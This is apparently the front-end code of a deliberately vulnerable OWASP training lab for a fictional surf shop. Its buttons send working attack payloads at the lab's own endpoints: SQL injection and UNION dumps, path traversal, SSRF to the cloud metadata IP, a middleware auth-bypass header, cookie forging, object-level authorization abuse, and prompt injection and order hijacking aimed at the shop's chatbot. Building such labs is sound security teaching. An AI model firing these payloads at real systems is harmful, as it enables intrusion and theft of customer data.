"use client";

import { useState } from "react";
import Link from "next/link";
import type { LabInteraction } from "@/lib/owaspLabs";
import {
  DEMO_LOGIN_ADMIN,
  DEMO_LOGIN_JORDAN,
  ORDER_HIJACK_DISCOVER,
  ORDER_HIJACK_SHIP,
  PROMPT_INJECTION,
  PUBLIC_CUSTOMER_EXPORT_URL,
  TRAVERSAL_FILE,
  YAML_CHECKOUT_BODY,
} from "@/lib/shopTraffic";

function Result({ data }: { data: unknown }) {
  if (data == null) return null;
  return (
    <pre className="mt-3 max-h-64 overflow-auto rounded-lg bg-ocean-950 p-3 text-[11px] text-ocean-100">
      {typeof data === "string" ? data : JSON.stringify(data, null, 2)}
    </pre>
  );
}

function useLabAction() {
  const [busy, setBusy] = useState(false);
  const [result, setResult] = useState<unknown>(null);
  const [error, setError] = useState("");

  async function run(fn: () => Promise<unknown>) {
    setBusy(true);
    setError("");
    setResult(null);
    try {
      setResult(await fn());
    } catch (e) {
      setError(e instanceof Error ? e.message : "Request failed");
    } finally {
      setBusy(false);
    }
  }

  return { busy, result, error, run };
}

function BoardPreviewLab() {
  const { busy, result, error, run } = useLabAction();
  return (
    <div className="space-y-3">
      <p className="text-sm text-ocean-600">
        One Create-A-Board deck preview (Pillow sink on chat-rag).
      </p>
      <button
        type="button"
        disabled={busy}
        className="btn-primary text-sm"
        onClick={() =>
          run(async () => {
            const res = await fetch("/api/board/preview", {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({
                design: "lab-twin-fin",
                style_notes: "OWASP CVE lab deck preview",
              }),
            });
            return { status: res.status, body: await res.json() };
          })
        }
      >
        {busy ? "Previewing…" : "Run deck preview once"}
      </button>
      <p className="text-xs text-ocean-500">
        Same sink as{" "}
        <Link href="/design" className="underline">
          /design
        </Link>
        .
      </p>
      {error && <p className="text-sm text-coral-700">{error}</p>}
      <Result data={result} />
    </div>
  );
}

function DownloadLab() {
  const { busy, result, error, run } = useLabAction();
  const [name, setName] = useState("wax-care.txt");
  return (
    <div className="space-y-3">
      <label className="block text-sm">
        <span className="text-ocean-700 font-medium">Document name</span>
        <input
          value={name}
          onChange={(e) => setName(e.target.value)}
          className="mt-1 w-full rounded-lg border border-ocean-200 px-3 py-2 text-sm font-mono"
        />
      </label>
      <div className="flex flex-wrap gap-2">
        <button type="button" className="btn-secondary text-xs" onClick={() => setName("wax-care.txt")}>
          Benign: wax-care.txt
        </button>
        <button
          type="button"
          className="btn-secondary text-xs"
          onClick={() => setName(TRAVERSAL_FILE)}
        >
          Traversal payload
        </button>
      </div>
      <button
        type="button"
        disabled={busy}
        className="btn-primary text-sm"
        onClick={() =>
          run(async () => {
            const res = await fetch(`/api/downloads/asset?name=${encodeURIComponent(name)}`);
            return { status: res.status, body: await res.json() };
          })
        }
      >
        {busy ? "Downloading…" : "Download"}
      </button>
      {error && <p className="text-sm text-coral-700">{error}</p>}
      <Result data={result} />
    </div>
  );
}

function OrdersBolaLab() {
  const { busy, result, error, run } = useLabAction();
  const [email, setEmail] = useState("sam.rivera@example.com");
  return (
    <div className="space-y-3">
      <button
        type="button"
        disabled={busy}
        className="btn-secondary text-sm"
        onClick={() =>
          run(async () => {
            const res = await fetch("/api/auth/login", {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify(DEMO_LOGIN_JORDAN),
            });
            return { status: res.status, body: await res.json() };
          })
        }
      >
        1. Sign in as Jordan
      </button>
      <label className="block text-sm">
        <span className="text-ocean-700 font-medium">Lookup email</span>
        <input
          value={email}
          onChange={(e) => setEmail(e.target.value)}
          className="mt-1 w-full rounded-lg border border-ocean-200 px-3 py-2 text-sm font-mono"
        />
      </label>
      <button
        type="button"
        disabled={busy}
        className="btn-primary text-sm"
        onClick={() =>
          run(async () => {
            const res = await fetch(`/api/orders/mine?email=${encodeURIComponent(email)}`);
            return { status: res.status, body: await res.json() };
          })
        }
      >
        2. Fetch orders for email
      </button>
      {error && <p className="text-sm text-coral-700">{error}</p>}
      <Result data={result} />
    </div>
  );
}

function LoginLab() {
  const { busy, result, error, run } = useLabAction();
  return (
    <div className="space-y-3 text-sm text-ocean-700">
      <ul className="font-mono text-xs space-y-1">
        <li>jordan.lee@example.com / jordanwaves</li>
        <li>sam.rivera@example.com / samwaves</li>
        <li>admin@jayssurfshop.example / staffadmin</li>
      </ul>
      <button
        type="button"
        disabled={busy}
        className="btn-primary text-sm"
        onClick={() =>
          run(async () => {
            const res = await fetch("/api/auth/login", {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify(DEMO_LOGIN_JORDAN),
            });
            return { status: res.status, body: await res.json() };
          })
        }
      >
        Sign in as Jordan
      </button>
      <div className="rounded-lg border border-ocean-100 bg-ocean-50/60 p-3 text-xs leading-relaxed">
        <p className="font-medium text-ocean-900 mb-1">Forge session (manual)</p>
        <p>
          DevTools → Cookies → <code>jss_user_session</code> → base64url-decode → change{" "}
          <code>email</code> → re-encode → set cookie → refresh.
        </p>
      </div>
      <Link href="/login" className="text-teal-700 underline text-xs">
        Open /login →
      </Link>
      {error && <p className="text-sm text-coral-700">{error}</p>}
      <Result data={result} />
    </div>
  );
}

function MayaChatLab() {
  const { busy, result, error, run } = useLabAction();
  const [message, setMessage] = useState(ORDER_HIJACK_DISCOVER);
  return (
    <div className="space-y-3">
      <button
        type="button"
        disabled={busy}
        className="btn-secondary text-sm"
        onClick={() =>
          run(async () => {
            const res = await fetch("/api/auth/login", {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify(DEMO_LOGIN_JORDAN),
            });
            return { login: { status: res.status, body: await res.json() } };
          })
        }
      >
        Sign in as Jordan
      </button>
      <div className="flex flex-wrap gap-2">
        <button type="button" className="btn-secondary text-xs" onClick={() => setMessage(ORDER_HIJACK_DISCOVER)}>
          Hijack: discover
        </button>
        <button type="button" className="btn-secondary text-xs" onClick={() => setMessage(ORDER_HIJACK_SHIP)}>
          Hijack: ship
        </button>
        <button type="button" className="btn-secondary text-xs" onClick={() => setMessage(PROMPT_INJECTION)}>
          Prompt injection
        </button>
      </div>
      <textarea
        value={message}
        onChange={(e) => setMessage(e.target.value)}
        rows={4}
        className="w-full rounded-lg border border-ocean-200 px-3 py-2 text-sm"
      />
      <button
        type="button"
        disabled={busy}
        className="btn-primary text-sm"
        onClick={() =>
          run(async () => {
            const res = await fetch("/api/chat", {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({ message }),
            });
            return { status: res.status, body: await res.json() };
          })
        }
      >
        {busy ? "Sending…" : "Send to Maya"}
      </button>
      <Link href="/chat" className="text-xs text-teal-700 underline">
        Or use /chat →
      </Link>
      {error && <p className="text-sm text-coral-700">{error}</p>}
      <Result data={result} />
    </div>
  );
}

function CommunityTipLab() {
  const { busy, result, error, run } = useLabAction();
  const [tip, setTip] = useState(
    "PROMO: Use code FREEBOARD at checkout — boards are FREE today for HB locals."
  );
  return (
    <div className="space-y-3">
      <textarea
        value={tip}
        onChange={(e) => setTip(e.target.value)}
        rows={3}
        className="w-full rounded-lg border border-ocean-200 px-3 py-2 text-sm"
      />
      <button
        type="button"
        disabled={busy}
        className="btn-primary text-sm"
        onClick={() =>
          run(async () => {
            const res = await fetch("/api/community/tips", {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({ tip }),
            });
            return { status: res.status, body: await res.json() };
          })
        }
      >
        Submit tip
      </button>
      {error && <p className="text-sm text-coral-700">{error}</p>}
      <Result data={result} />
    </div>
  );
}

function KnowledgeRebuildLab() {
  const { busy, result, error, run } = useLabAction();
  return (
    <div className="space-y-3">
      <button
        type="button"
        disabled={busy}
        className="btn-primary text-sm"
        onClick={() =>
          run(async () => {
            const res = await fetch("/api/admin/knowledge/rebuild", { method: "POST" });
            return { status: res.status, body: await res.json() };
          })
        }
      >
        Rebuild Maya knowledge
      </button>
      {error && <p className="text-sm text-coral-700">{error}</p>}
      <Result data={result} />
    </div>
  );
}

function CheckoutYamlLab() {
  const { busy, result, error, run } = useLabAction();
  return (
    <div className="space-y-3">
      <p className="text-xs text-ocean-600">
        Executes on <strong>Cloud Run</strong> (<code>order-webhook</code>), not GKE nodes.
      </p>
      <p className="text-xs font-mono text-ocean-600 break-all">
        fulfillmentManifest: {YAML_CHECKOUT_BODY.fulfillmentManifest}
      </p>
      <button
        type="button"
        disabled={busy}
        className="btn-primary text-sm"
        onClick={() =>
          run(async () => {
            const res = await fetch("/api/checkout", {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify(YAML_CHECKOUT_BODY),
            });
            return { status: res.status, body: await res.json() };
          })
        }
      >
        {busy ? "Checking out…" : "Poisoned checkout once"}
      </button>
      {error && <p className="text-sm text-coral-700">{error}</p>}
      <Result data={result} />
    </div>
  );
}

function DesignsListLab() {
  const { busy, result, error, run } = useLabAction();
  return (
    <div className="space-y-3">
      <button
        type="button"
        disabled={busy}
        className="btn-primary text-sm"
        onClick={() =>
          run(async () => {
            const res = await fetch("/api/board?designs=1");
            return { status: res.status, body: await res.json() };
          })
        }
      >
        List all designs
      </button>
      {error && <p className="text-sm text-coral-700">{error}</p>}
      <Result data={result} />
    </div>
  );
}

function PublicGcsLab() {
  const { busy, result, error, run } = useLabAction();
  return (
    <div className="space-y-3">
      <a
        href={PUBLIC_CUSTOMER_EXPORT_URL}
        target="_blank"
        rel="noreferrer"
        className="btn-primary text-sm inline-flex"
      >
        Open public customer export →
      </a>
      <button
        type="button"
        disabled={busy}
        className="btn-secondary text-sm"
        onClick={() =>
          run(async () => {
            const res = await fetch(PUBLIC_CUSTOMER_EXPORT_URL);
            const text = await res.text();
            try {
              return { status: res.status, body: JSON.parse(text) };
            } catch {
              return { status: res.status, body: text.slice(0, 800) };
            }
          })
        }
      >
        Fetch via browser
      </button>
      {error && <p className="text-sm text-coral-700">{error}</p>}
      <Result data={result} />
    </div>
  );
}

function StaffBypassLab() {
  const { busy, result, error, run } = useLabAction();
  return (
    <div className="space-y-3">
      <button
        type="button"
        disabled={busy}
        className="btn-primary text-sm"
        onClick={() =>
          run(async () => {
            const res = await fetch("/admin", {
              headers: {
                "x-middleware-subrequest":
                  "src/middleware:src/middleware:src/middleware:src/middleware:src/middleware",
              },
            });
            const text = await res.text();
            return {
              status: res.status,
              preview: text.slice(0, 400),
              hit_ops_console: text.includes("Ops console") || text.includes("Staff only"),
            };
          })
        }
      >
        Probe /admin with bypass header
      </button>
      <Link href="/staff-login" className="text-xs text-teal-700 underline block">
        Or use /staff-login →
      </Link>
      {error && <p className="text-sm text-coral-700">{error}</p>}
      <Result data={result} />
    </div>
  );
}

function AdminUsersLab() {
  const { busy, result, error, run } = useLabAction();
  return (
    <div className="space-y-3">
      <button
        type="button"
        disabled={busy}
        className="btn-secondary text-sm"
        onClick={() =>
          run(async () => {
            const res = await fetch("/api/auth/login", {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify(DEMO_LOGIN_ADMIN),
            });
            return { login: { status: res.status, body: await res.json() } };
          })
        }
      >
        1. Sign in as staffadmin
      </button>
      <button
        type="button"
        disabled={busy}
        className="btn-primary text-sm"
        onClick={() =>
          run(async () => {
            const res = await fetch("/api/admin/users");
            return { status: res.status, body: await res.json() };
          })
        }
      >
        2. GET /api/admin/users
      </button>
      {error && <p className="text-sm text-coral-700">{error}</p>}
      <Result data={result} />
    </div>
  );
}

function SqliLoginLab() {
  const { busy, result, error, run } = useLabAction();
  const [email, setEmail] = useState("' OR 1=1--");
  const [password, setPassword] = useState("x");
  return (
    <div className="space-y-3">
      <p className="text-xs text-ocean-600 leading-relaxed">
        Accounts are in SQLite. Login interpolates email + password hash into SQL.
      </p>
      <div className="flex flex-wrap gap-2">
        <button
          type="button"
          className="btn-secondary text-xs"
          onClick={() => {
            setEmail("jordan.lee@example.com");
            setPassword("jordanwaves");
          }}
        >
          Normal login
        </button>
        <button
          type="button"
          className="btn-secondary text-xs"
          onClick={() => {
            setEmail("' OR 1=1--");
            setPassword("x");
          }}
        >
          Bypass OR 1=1
        </button>
        <button
          type="button"
          className="btn-secondary text-xs"
          onClick={() => {
            setEmail(
              "' UNION SELECT email,name,role,demo_password,saved_shipping_address FROM users--"
            );
            setPassword("x");
          }}
        >
          UNION dump
        </button>
      </div>
      <label className="block text-sm">
        <span className="text-ocean-700 font-medium">Email</span>
        <input
          value={email}
          onChange={(e) => setEmail(e.target.value)}
          className="mt-1 w-full rounded-lg border border-ocean-200 px-3 py-2 text-sm font-mono"
        />
      </label>
      <label className="block text-sm">
        <span className="text-ocean-700 font-medium">Password</span>
        <input
          value={password}
          onChange={(e) => setPassword(e.target.value)}
          className="mt-1 w-full rounded-lg border border-ocean-200 px-3 py-2 text-sm font-mono"
        />
      </label>
      <button
        type="button"
        disabled={busy}
        className="btn-primary text-sm"
        onClick={() =>
          run(async () => {
            const res = await fetch("/api/auth/login", {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({ email, password }),
            });
            return { status: res.status, body: await res.json() };
          })
        }
      >
        {busy ? "Submitting…" : "POST /api/auth/login"}
      </button>
      {error && <p className="text-sm text-coral-700">{error}</p>}
      <Result data={result} />
    </div>
  );
}

function SsrfFetchLab() {
  const { busy, result, error, run } = useLabAction();
  const [url, setUrl] = useState("http://chat-rag:8001/health");
  return (
    <div className="space-y-3">
      <p className="text-xs text-ocean-600 leading-relaxed">
        Media import fetches whatever URL you give — from the chat-rag pod network.
      </p>
      <div className="flex flex-wrap gap-2">
        <button
          type="button"
          className="btn-secondary text-xs"
          onClick={() => setUrl("https://example.com")}
        >
          example.com
        </button>
        <button
          type="button"
          className="btn-secondary text-xs"
          onClick={() => setUrl("http://chat-rag:8001/health")}
        >
          Internal health
        </button>
        <button
          type="button"
          className="btn-secondary text-xs"
          onClick={() =>
            setUrl("http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/")
          }
        >
          GCP metadata IP
        </button>
      </div>
      <label className="block text-sm">
        <span className="text-ocean-700 font-medium">URL</span>
        <input
          value={url}
          onChange={(e) => setUrl(e.target.value)}
          className="mt-1 w-full rounded-lg border border-ocean-200 px-3 py-2 text-sm font-mono"
        />
      </label>
      <button
        type="button"
        disabled={busy}
        className="btn-primary text-sm"
        onClick={() =>
          run(async () => {
            const res = await fetch("/api/media/fetch", {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({ url }),
            });
            return { status: res.status, body: await res.json() };
          })
        }
      >
        {busy ? "Fetching…" : "Fetch URL"}
      </button>
      {error && <p className="text-sm text-coral-700">{error}</p>}
      <Result data={result} />
    </div>
  );
}

function CloudRunShellLab() {
  const { busy, result, error, run } = useLabAction();
  return (
    <div className="space-y-3">
      <p className="text-sm text-ocean-600">
        Hits <code className="text-xs">order-webhook</code> on <strong>Cloud Run</strong> — not a
        GKE pod. Runs <code className="text-xs">id | tee</code> for Shell Process Redirect.
      </p>
      <button
        type="button"
        disabled={busy}
        className="btn-primary text-sm"
        onClick={() =>
          run(async () => {
            const res = await fetch("/api/fulfillment/carrier-check", { method: "POST" });
            return { status: res.status, body: await res.json() };
          })
        }
      >
        {busy ? "Checking…" : "Run carrier check once"}
      </button>
      {error && <p className="text-sm text-coral-700">{error}</p>}
      <Result data={result} />
    </div>
  );
}

function CloudRunAvLab() {
  const { busy, result, error, run } = useLabAction();
  return (
    <div className="space-y-3">
      <p className="text-sm text-ocean-600">
        Writes EICAR under <code className="text-xs">/tmp</code> inside the Cloud Run revision.
      </p>
      <button
        type="button"
        disabled={busy}
        className="btn-primary text-sm"
        onClick={() =>
          run(async () => {
            const res = await fetch("/api/fulfillment/av-sample", { method: "POST" });
            return { status: res.status, body: await res.json() };
          })
        }
      >
        {busy ? "Writing…" : "Attach AV sample once"}
      </button>
      {error && <p className="text-sm text-coral-700">{error}</p>}
      <Result data={result} />
    </div>
  );
}

export default function LabInteractionPanel({
  interaction,
}: {
  interaction: LabInteraction;
}) {
  switch (interaction) {
    case "board-preview":
      return <BoardPreviewLab />;
    case "download":
      return <DownloadLab />;
    case "orders-bola":
      return <OrdersBolaLab />;
    case "login":
    case "session-forge":
      return <LoginLab />;
    case "sqli-login":
      return <SqliLoginLab />;
    case "ssrf-fetch":
      return <SsrfFetchLab />;
    case "maya-chat":
      return <MayaChatLab />;
    case "community-tip":
      return <CommunityTipLab />;
    case "knowledge-rebuild":
      return <KnowledgeRebuildLab />;
    case "checkout-yaml":
      return <CheckoutYamlLab />;
    case "cloudrun-shell":
      return <CloudRunShellLab />;
    case "cloudrun-av":
      return <CloudRunAvLab />;
    case "designs-list":
      return <DesignsListLab />;
    case "public-gcs":
      return <PublicGcsLab />;
    case "staff-bypass":
      return <StaffBypassLab />;
    case "admin-users":
      return <AdminUsersLab />;
    default:
      return <p className="text-sm text-ocean-500">No interaction wired.</p>;
  }
}
